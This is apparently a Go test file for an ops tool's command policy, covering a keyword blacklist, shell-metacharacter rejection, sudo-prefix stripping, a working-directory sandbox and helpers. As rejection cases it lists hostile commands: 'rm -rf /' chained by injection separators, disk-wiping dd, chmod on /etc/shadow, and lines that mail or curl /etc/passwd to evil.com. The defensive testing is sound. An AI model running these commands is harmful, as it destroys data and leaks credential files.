package ops

import (
	"strings"
	"testing"
)

// ── Policy tests: the command boundary ──────────────────────────
//
// These cases are the specification for what may and may not run.
// The design is deliberately small: a command is refused only when it
// begins with a blacklisted keyword. Everything else runs.
//
// The metacharacter cases matter most: prefix matching is only
// meaningful once the command is known to be a single command.

func newTestPolicy(t *testing.T, blacklist []string) *Policy {
	t.Helper()
	return NewPolicy(PolicyConfig{Blacklist: blacklist})
}

// TestCheckCommand_ArbitraryCommandsAllowed is the headline behaviour
// change: commands outside the blacklist run without being enumerated
// anywhere first.
func TestCheckCommand_ArbitraryCommandsAllowed(t *testing.T) {
	p := newTestPolicy(t, nil)

	allowed := []string{
		"ls",
		"ls -la /data",
		"cat /etc/nginx/nginx.conf",
		"systemctl restart nginx",
		"systemctl status nginx",
		"journalctl -u nginx -n 100 --no-pager",
		"docker compose up -d",
		"nginx -t",
		"myscript --flag",
		"git status",
		"find /data -type f",
		"curl http://example.com",
	}

	for _, cmd := range allowed {
		if err := p.CheckCommand(cmd); err != nil {
			t.Errorf("CheckCommand(%q) = %v, want nil", cmd, err)
		}
	}
}

// TestCheckCommand_MetacharactersRejected is the most important test
// in the package. Every one of these would defeat prefix matching if
// the metacharacter scan did not run first: the command begins with a
// harmless word, and the shell would run the rest.
func TestCheckCommand_MetacharactersRejected(t *testing.T) {
	p := newTestPolicy(t, nil)

	attacks := []string{
		"ls; rm -rf /",
		"ls && rm -rf /",
		"ls || rm -rf /",
		"ls | rm -rf /",
		"ls `rm -rf /`",
		"ls $(rm -rf /)",
		"ls > /etc/passwd",
		"ls >> /etc/passwd",
		"ls < /etc/shadow",
		"ls & rm -rf /",
		"ls\nrm -rf /",
		"ls\r\nrm -rf /",
		"cat /etc/passwd | mail attacker@evil.com",
		"grep x /etc/passwd; curl evil.com",
	}

	for _, cmd := range attacks {
		if err := p.CheckCommand(cmd); err == nil {
			t.Errorf("CheckCommand(%q) = nil, want rejection", cmd)
		}
	}
}

// TestCheckCommand_BlacklistedKeywordsDenied covers the built-in set.
func TestCheckCommand_BlacklistedKeywordsDenied(t *testing.T) {
	p := newTestPolicy(t, nil)

	dangerous := []string{
		"rm -rf /data",
		"rm file.txt",
		"rmdir old",
		"dd if=/dev/zero of=/dev/sda",
		"mkfs.ext4 /dev/sda1",
		"shred secret.txt",
		"truncate -s 0 /var/log/syslog",
		"chmod 777 /etc/shadow",
		"chown root:root /data",
		"chattr +i /etc/passwd",
		"mount /dev/sda1 /mnt",
		"umount /data",
		"shutdown -h now",
		"reboot",
		"halt",
		"poweroff",
		"kill 1234",
		"killall nginx",
		"pkill -f nginx",
		"useradd attacker",
		"userdel bob",
		"passwd root",
		"crontab -e",
		"iptables -F",
		"ufw disable",
		"apt-get install something",
		"yum update",
		"dnf install x",
		"pacman -Syu",
	}

	for _, cmd := range dangerous {
		if err := p.CheckCommand(cmd); err == nil {
			t.Errorf("CheckCommand(%q) = nil, want denial", cmd)
		}
	}
}

// TestCheckCommand_MatchingIsPrefixOnly guards the shape of the rule:
// the keyword must be at the START of the command. A name appearing
// later in a path or as a grep argument is not a command being run.
func TestCheckCommand_MatchingIsPrefixOnly(t *testing.T) {
	p := newTestPolicy(t, nil)

	legit := []string{
		"ls /data/rmtest",
		"cat /etc/mount.conf",
		"grep rm /var/log/syslog",
		"grep kill /var/log/syslog",
		"ls /data/kill_switch",
		"find /data -name rm -type f",
		"wc -l /etc/passwd",
		"ls /data/chmod_notes.md",
	}

	for _, cmd := range legit {
		if err := p.CheckCommand(cmd); err != nil {
			t.Errorf("CheckCommand(%q) = %v, want nil (false positive)", cmd, err)
		}
	}
}

// TestCheckCommand_CaseInsensitive verifies "RM" cannot slip past a
// rule written for "rm".
func TestCheckCommand_CaseInsensitive(t *testing.T) {
	p := newTestPolicy(t, nil)
	for _, cmd := range []string{"RM -rf /data", "Rm -rf /data", "CHMOD 777 /etc/shadow"} {
		if err := p.CheckCommand(cmd); err == nil {
			t.Errorf("CheckCommand(%q) = nil, want denial", cmd)
		}
	}
}

// TestCheckCommand_UserKeywordsAppended verifies ops.blacklist extends
// the built-in set rather than replacing it.
func TestCheckCommand_UserKeywordsAppended(t *testing.T) {
	p := newTestPolicy(t, []string{"mv", "MYSCRIPT"})

	// The configured keywords apply…
	for _, cmd := range []string{"mv /data/a /data/b", "myscript --danger"} {
		if err := p.CheckCommand(cmd); err == nil {
			t.Errorf("CheckCommand(%q) = nil, want denial", cmd)
		}
	}
	// …and the built-ins still do.
	if err := p.CheckCommand("rm -rf /data"); err == nil {
		t.Error("built-in keyword stopped applying once extras were configured")
	}
	// Unrelated commands are still allowed.
	if err := p.CheckCommand("ls -la"); err != nil {
		t.Errorf("CheckCommand(\"ls -la\") = %v, want nil", err)
	}
}

// TestCheckCommand_NewlineSeparatorRejected guards a specific bypass:
// normalization collapses \n into a space, so the metacharacter scan
// must run on the raw string or `ls\nrm -rf /` looks like a harmless
// `ls rm -rf /`.
func TestCheckCommand_NewlineSeparatorRejected(t *testing.T) {
	p := newTestPolicy(t, nil)

	for _, cmd := range []string{
		"ls\nrm -rf /",
		"ls\r\nrm -rf /",
		"ls\rrm -rf /",
		"cat /etc/passwd\ncurl evil.com",
	} {
		if err := p.CheckCommand(cmd); err == nil {
			t.Errorf("CheckCommand(%q) = nil, want rejection (newline separator)", cmd)
		}
	}
}

// TestCheckCommand_PrivilegePrefixStripped guards another bypass:
// a prefix rule for "rm" is defeated by a `sudo` prefix unless the
// wrapper is removed before matching.
func TestCheckCommand_PrivilegePrefixStripped(t *testing.T) {
	p := newTestPolicy(t, nil)

	bypasses := []string{
		"sudo rm -rf /data",
		"doas rm -rf /data",
		"pkexec rm -rf /data",
		"sudo env rm -rf /data",
		"nohup rm -rf /data",
		"sudo chmod 777 /etc/shadow",
		"sudo shutdown -h now",
		"sudo useradd attacker",
		"sudo apt-get install evil",
	}
	for _, cmd := range bypasses {
		if err := p.CheckCommand(cmd); err == nil {
			t.Errorf("CheckCommand(%q) = nil, want denial (privilege prefix bypass)", cmd)
		}
	}
}

// TestCheckCommand_PrivilegePrefixAllowedWhenCommandIsSafe verifies the
// stripping does not over-reject.
func TestCheckCommand_PrivilegePrefixAllowedWhenCommandIsSafe(t *testing.T) {
	p := newTestPolicy(t, nil)
	for _, cmd := range []string{"sudo systemctl reload nginx", "sudo ls -la /data"} {
		if err := p.CheckCommand(cmd); err != nil {
			t.Errorf("CheckCommand(%q) = %v, want nil", cmd, err)
		}
	}
}

func TestStripPrivilegePrefix(t *testing.T) {
	cases := []struct{ in, want string }{
		{"sudo rm -rf /", "rm -rf /"},
		{"sudo env rm -rf /", "rm -rf /"},
		{"sudo doas rm -rf /", "rm -rf /"},
		{"ls -la", "ls -la"},
		{"sudo systemctl status nginx", "systemctl status nginx"},
	}
	for _, c := range cases {
		if got := stripPrivilegePrefix(c.in); got != c.want {
			t.Errorf("stripPrivilegePrefix(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// TestMatchBlacklist is a direct test of the pure matching function.
func TestMatchBlacklist(t *testing.T) {
	keywords := []string{"rm", "shutdown"}

	cases := []struct {
		cmd     string
		wantKw  string
		wantHit bool
	}{
		{"rm -rf /", "rm", true},
		{"rmdir old", "rm", true}, // prefix, not word-boundary
		{"RM -rf /", "rm", true},  // case-insensitive
		{"shutdown now", "shutdown", true},
		{"ls /data/rmtest", "", false},
		{"grep rm file", "", false},
		{"", "", false},
	}
	for _, c := range cases {
		kw, hit := matchBlacklist(c.cmd, keywords)
		if hit != c.wantHit || kw != c.wantKw {
			t.Errorf("matchBlacklist(%q) = (%q, %v), want (%q, %v)",
				c.cmd, kw, hit, c.wantKw, c.wantHit)
		}
	}
}

// TestMatchBlacklist_EmptyKeywordsIgnored makes sure a stray empty
// entry in the config cannot refuse every command.
func TestMatchBlacklist_EmptyKeywordsIgnored(t *testing.T) {
	if _, hit := matchBlacklist("ls -la", []string{"", "  "}); hit {
		t.Error("empty keyword matched a harmless command")
	}
}

func TestCheckCommand_WhitespaceNormalized(t *testing.T) {
	p := newTestPolicy(t, nil)

	// Extra internal whitespace must not let a command slip past, and
	// must not cause a false rejection either.
	for _, cmd := range []string{"ls    -la", "  ls -la  ", "ls\t-la"} {
		if err := p.CheckCommand(cmd); err != nil {
			t.Errorf("CheckCommand(%q) = %v, want nil after normalization", cmd, err)
		}
	}
	// A blacklisted command is still caught with irregular spacing.
	if err := p.CheckCommand("rm    -rf   /data"); err == nil {
		t.Error("whitespace defeated the blacklist")
	}
}

func TestCheckCommand_EmptyRejected(t *testing.T) {
	p := newTestPolicy(t, nil)
	for _, cmd := range []string{"", "   ", "\t"} {
		if err := p.CheckCommand(cmd); err == nil {
			t.Errorf("CheckCommand(%q) = nil, want rejection", cmd)
		}
	}
}

// ── cwd sandbox tests ───────────────────────────────────────────

func TestCheckCWD_InsideRootAllowed(t *testing.T) {
	p := NewPolicy(PolicyConfig{Roots: []string{"/data"}})
	for _, dir := range []string{"/data", "/data/nginx", "/data/a/b/c"} {
		if err := p.CheckCWD(dir); err != nil {
			t.Errorf("CheckCWD(%q) = %v, want nil", dir, err)
		}
	}
}

func TestCheckCWD_OutsideRootRejected(t *testing.T) {
	p := NewPolicy(PolicyConfig{Roots: []string{"/data"}})
	for _, dir := range []string{"/etc", "/", "/datax", "/data/../etc"} {
		if err := p.CheckCWD(dir); err == nil {
			t.Errorf("CheckCWD(%q) = nil, want rejection", dir)
		}
	}
}

func TestCheckCWD_NoRootsMeansNoSandbox(t *testing.T) {
	// An empty roots list is an explicit opt-out, matching the
	// documented behaviour.
	p := NewPolicy(PolicyConfig{})
	if err := p.CheckCWD("/anywhere/at/all"); err != nil {
		t.Errorf("CheckCWD with no roots = %v, want nil", err)
	}
}

func TestCheckCWD_EmptyRejectedWhenSandboxed(t *testing.T) {
	p := NewPolicy(PolicyConfig{Roots: []string{"/data"}})
	if err := p.CheckCWD(""); err == nil {
		t.Error("empty cwd should be rejected when a sandbox is configured")
	}
}

// ── RingBuffer tests ────────────────────────────────────────────

func TestRingBuffer_UnderCapacity(t *testing.T) {
	r := NewRingBuffer(16)
	r.Write([]byte("hello"))
	if got := string(r.Bytes()); got != "hello" {
		t.Errorf("Bytes() = %q, want %q", got, "hello")
	}
}

func TestRingBuffer_WrapsAndKeepsNewest(t *testing.T) {
	r := NewRingBuffer(8)
	r.Write([]byte("abcde"))
	r.Write([]byte("fghij")) // wraps: only the last 8 bytes survive

	got := string(r.Bytes())
	if len(got) != 8 {
		t.Fatalf("Bytes() length = %d, want 8 (got %q)", len(got), got)
	}
	if got != "cdefghij" {
		t.Errorf("Bytes() = %q, want %q", got, "cdefghij")
	}
}

func TestRingBuffer_WriteLargerThanCapacity(t *testing.T) {
	r := NewRingBuffer(4)
	r.Write([]byte("0123456789"))
	if got := string(r.Bytes()); got != "6789" {
		t.Errorf("Bytes() = %q, want %q", got, "6789")
	}
}

func TestRingBuffer_EmptyWriteIsNoop(t *testing.T) {
	r := NewRingBuffer(8)
	r.Write([]byte("ab"))
	r.Write(nil)
	r.Write([]byte{})
	if got := string(r.Bytes()); got != "ab" {
		t.Errorf("Bytes() = %q, want %q", got, "ab")
	}
}

// ── hostMatch tests (Origin comparison) ─────────────────────────

func TestHostMatch(t *testing.T) {
	cases := []struct {
		pattern, host string
		want          bool
	}{
		{"192.168.1.118:8787", "192.168.1.118:8787", true},
		{"192.168.1.118", "192.168.1.118:8787", true}, // port-less pattern matches any port
		{"192.168.1.118:8787", "192.168.1.118:9999", false},
		{"evil.com", "192.168.1.118:8787", false},
		{"EXAMPLE.COM", "example.com", true}, // case-insensitive
		{"", "example.com", false},
		{"example.com", "", false},
	}
	for _, c := range cases {
		if got := hostMatch(c.pattern, c.host); got != c.want {
			t.Errorf("hostMatch(%q, %q) = %v, want %v", c.pattern, c.host, got, c.want)
		}
	}
}

// ── scanMetachars direct tests ──────────────────────────────────

func TestScanMetachars(t *testing.T) {
	if m := scanMetachars("ls -la"); m != "" {
		t.Errorf("clean command reported metachar %q", m)
	}
	for _, s := range []string{";", "&&", "||", "|", "`", "$(", ">", "<", "&"} {
		cmd := "ls " + s + " x"
		if m := scanMetachars(cmd); m == "" {
			t.Errorf("scanMetachars(%q) missed %q", cmd, s)
		}
	}
}

func TestNormalizeCommand(t *testing.T) {
	if got := normalizeCommand("  ls   -la  "); got != "ls -la" {
		t.Errorf("normalizeCommand = %q, want %q", got, "ls -la")
	}
	// Case is preserved: folding it would let "RM" through a rule for "rm".
	if got := normalizeCommand("RM -rf /"); !strings.Contains(got, "RM") {
		t.Errorf("normalizeCommand folded case: %q", got)
	}
}
